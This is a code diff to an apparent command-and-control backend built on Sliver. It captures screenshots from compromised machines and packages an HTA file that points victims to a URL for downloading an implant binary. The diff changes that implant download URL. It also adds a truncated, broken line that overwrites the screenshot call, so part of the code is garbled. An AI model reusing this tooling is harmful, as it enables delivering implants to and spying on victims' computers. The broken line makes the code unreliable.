@@ -178,6 +178,8 @@ app.add_middleware(
     max_age=3600,
 )
 
+backend_url = "http://localhost:8000"
+
 # Add request logging middleware
 # @app.middleware("http")
 # async def log_requests(request: Request, call_next):
@@ -486,6 +488,7 @@ async def get_screenshot():
     try:
         # Get screenshot from sliver session
         screenshot_pb = await _current_interactive_session.screenshot()
+        screenshot_pb = await _current_interactive_session.r
 
         # Extract PNG data from protobuf
         png_data = screenshot_pb.Data  # or screenshot_pb.image_data
@@ -1754,11 +1757,10 @@ def generate_zip(
     print(TXT_FILE_PATH)
     if not os.path.exists(TXT_FILE_PATH):
         print("path does not exists")
-        # make a text file on run time that has data = "http://localhost:8000/implant_name"
         raise HTTPException(status_code=404, detail="Text file not found on server.")
 
     with open(TXT_FILE_PATH, 'w') as file:
-        file.write("http://localhost:8000/download_implant_binary/"+implant_name)
+        file.write(backend_url + "/download_implant_binary/" + implant_name)
 
     payload_size = os.path.getsize(TXT_FILE_PATH)
     hta_file = create_hta_file(zipname, payload_size)
